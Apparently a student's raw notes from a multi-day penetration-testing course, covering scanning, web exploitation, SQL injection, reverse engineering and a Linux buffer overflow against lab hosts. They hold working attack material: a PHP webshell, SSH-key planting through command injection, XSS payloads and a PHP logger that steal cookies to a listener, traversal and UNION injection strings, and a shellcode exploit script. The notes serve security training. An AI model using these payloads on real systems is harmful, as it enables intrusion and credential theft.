grey host 10.50.41.117



ctxBvVwnguAb8vx


GOOGLE 


put - . in ""

can use AND and OR in statemates

MITRE CVE
-list of vunerabilities

exploitdb
-exploit database

search site: <website>


IMPORTANT
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<HTML><BODY>
  2 <FORM METHOD="GET" NAME="myform" ACTION="">
  3 <INPUT TYPE="text" NAME="cmd">
  4 <INPUT TYPE="submit" VALUE="Send">
  5 </FORM>
  6 <pre>
  7 <?php
  8 if ($_GET['cmd']) {
  9     system($_GET['cmd']);
 10 }
 -shell
 
 Command Injection
 -using the websites native box to run commands


-on linops 
 ssh-keygen -t rsa -b 4096
where, passphrase default
will save to ~/.ssh/id_rsa.pub id_rsa

go to key directory

cat public key

-on webshell or command injection

;mkdir /var/www/.ssh
;ls -la /var/www

;echo "<public key>" > /var/www/.ssh/authorized_keys

-on linops

ssh -i .ssh/id_rsa www-data@10.50.37.95

DAY 1 PENETRAION TESTING
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


op-notes
-techical informationÂ 
-your own notes
-raw jargon

Formalized Reports
-written for anyone to understand
-breif higher ups


VULNERABILITIES AND EXPLOITATION


Initial Access
-phisihing is the most comman initial access

Phishing 
-targeting anyone

Spear Phising 
-targets a group


EXPLOIT RESEARCH

Open source
-multiple sources
-vet everything

Organizational capabilities

Exploitation
-more passive 
-usually assisting a main purpose

Attack
-like kinetic war 



TESTING
Exploit Development occurs from vulnerability pairing and mission-drivens requirement

Test and verify success

Testing provides a number of benefits:

Faster time to breakout of initial foothold

Reduced risk of detection and/or tool failure

Improved recovery times


Plan a Procedured



SCANNING AND RECONAISSANCE

DoD States:
"produced from publicly available information that is collected, exploited, and disseminated in a timely manner to an appropriate audience for addressing a specific intelligence requirement."
-cannot do OSINT whenever you want
-has to fit specific mission scope
-use legal team to knows laws for collecting in that counrty

NOFORN = sources and methods 


Deep Web
-unlisted web pages like banks accounts 

Dark Web
-does not use normal web browser




HTML

-view source code 







pip install lxml requests

#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)




SCANNING TECHNIQUES

-annotate any creds and ports running ssh
-annotate on map

nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80,8080,8888,2222,4444

for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done

nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=smb-os-discovery.nse

Banner Grabbing
nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=banner.nse
nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=http-enum.nse



/usr/share/nmap/scripts



DAY 2 WEB EXPLOITATION
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

HTTP METHODS

GET

POST

HEAD

PUT

https://tools.ietf.org/html/rfc2616

RESPONSE CODES


10X == Informational

2XX == Success

30X == Redirection

4XX == Client Error

5XX == Server Error

https://tools.ietf.org/html/rfc2616

FIELDS

User-Agent

Referer

Cookie

Date

Server

Set-Cookie


https://www.columbiacountyga.gov/Home/Components/JobPosts/Job/1/1
/something.php?var=hi
-notes for using GET


ROBOTS.TXT

Legitimate surfing

Tools:

NSE scripts(nmap)

Nikto

Burp suite (outside class)


nikto -host 10.50.37.95


<script>alert("VULN XXS")<script>
-gives a popup on the page



<script>document.location="http://10.50.32.237:8000/+document.cookie;<script>
-redirects cookies to your ip


python3 -m http.server
-stars an http server 

<script>document.location="http://10.100.28.40/uploads/cookie.php username="+document.cookie;<script>



<?php
$cookie = $_GET["username"]	REASON
REVOKED	REVOKE
EFF DATE
MMB	20210722	00000000	00000000	
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>



<HTML><BODY>
  2 <FORM METHOD="GET" NAME="myform" ACTION="">
  3 <INPUT TYPE="text" NAME="cmd">
  4 <INPUT TYPE="submit" VALUE="Send">
  5 </FORM>
  6 <pre>
  7 <?php
  8 if ($_GET['cmd']) {
  9     system($_GET['cmd']);
 10 }

-webshell


file traversal
../../../../../../etc/passwd
-adjust how many files back it could be




DAY 3 SQL INJECTION
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

mysql
-starts sql

show databases;
-show data

show tables from session;
-show specific table from database

select * from session.Tires;
-select everything from a session

select tireid,name,cost from seesion.Tires;
-shows specific columns from session

use session;
-go into session
  select * from Tires;
  

-character entries are in quotes by default and can be broken by adding your own quotes

User' OR '1=1

http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3
-find feilds available abd what order they display

Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns

User guide .columns in reasouce

Selection=2 UNION select name,type,cost from session.car;#

Selection=2 UNION select id,pass,name from session.user;#



DAY 4 Reverse Engineering/Binary Analysis
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

X86_64 Assembly

%rax - first return register

%rbp - base of the stack

%rsp - top of the stack

%rip - instruction pointer
- points to the memory offset of the next instruction

Heap - dynamicly allocated 

Stack - static stack

JZ - jump if zero

JNZ - jump if not zero

drag exe onto ida

view
  subviews
    strings 

(press h on hex to return to decimmal)

(in ida when ebp + var means user input)

GHIDRA
new project

file
  import file
    
search 
  for strings
    (find sting you want an slect it, will lead to assembly)
    
you can rename varibles to help keep track of code

param_1 usually user input



PATCH

IDA 

edit 
  patch program 
    assemble
    
edit 
  patch program 
    apply patches
    



GHIDRA

right click 
  patch instruction
  
File
  export program
  

  
  

DAY 6 EXPLOITATION DEVELOPMENT
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Buffer Overflow Linux

test for overflow 
  dump characters into prompt until Segmentation fault (core dumped)
  
GDB
  
gdb func
-opens func in gdb

pdisass main
-program dissasemble main function
 -keep going through functions until you find a vunerable function


run
-runs program

<<<
-requires user input


find exact overflow offest value
-wiremask.eu
  tools
    buffer overflow pattern generator
    
generate pattern and put it on the program

take hex value of value of choice and put it into website to get offset

use offset with function to check oberflow bytes
run <<< $(python /home/student/BUFFER_OVERFLOW_BS)

look for valid jump ESPs
  close peda
  
  env - gdb 
  -open standard gdb
  
  show env
  
  unset env <LINES,COULUMS>
  
  file <filename>
  -selects file
  
  run
  
  info proc map
  -search heap for jump esp
  
  find /b <first start addr under heap>, <first address under stack>, 0xff, 0xe4
  -0xff = jump
  -0xe4 = esp
  
  grab a hand full of addresses 
  
  put them as comment in your script and split them into bytes
  
  1 offest = "A" * 62
  2 eip = "B" * 4
  3 '''
  4 0xf7 f6 86 3b
  5 0xf7 f6 87 0b
  6 0xf7 f6 87 33
  7 0xf7 f6 87 bb
  8 0xf7 f6 88 53
  9 0xf7 f6 95 6b
 10 '''
 11 
 12 eip = "\x3b\x86\xf6\xf7"
 13 nop = "\x90" * 10
 14 
 15 buf =  b""
 16 buf += b"\xdb\xd1\xd9\x74\x24\xf4\xbe\x7d\x8a\xc2\x6f\x5b\x2b"
 17 buf += b"\xc9\xb1\x0c\x31\x73\x1a\x03\x73\x1a\x83\xc3\x04\xe2"
 18 buf += b"\x88\xe0\xc9\x37\xeb\xa7\xab\xaf\x26\x2b\xbd\xd7\x50"
 19 buf += b"\x84\xce\x7f\xa0\xb2\x1f\xe2\xc9\x2c\xe9\x01\x5b\x59"
 20 buf += b"\xe5\xc5\x5b\x99\xd9\xa7\x32\xf7\x0a\x5f\xac\x68\x34"
 21 buf += b"\xf2\x45\x77\xe1\x5f\x1c\x96\xc0\xe0"
 22 
 23 print(offest + eip + nop + buf)
  
 if doesn't work double nop sled
 

msfvenom -p linux/x86/exec CMD="/bin/whoami" -b "\x00" -f python
-p payload
-b bad characters
(only bad charater in mod x00)
-f format

copy all buf 

paste under nop sled

checklist
-verify offest
-eip in reverse endian order
-verify nop sled 
-shell code bf only
-varaibles in correct order



troubleshooting 
-extend nop sled
-pick new eip












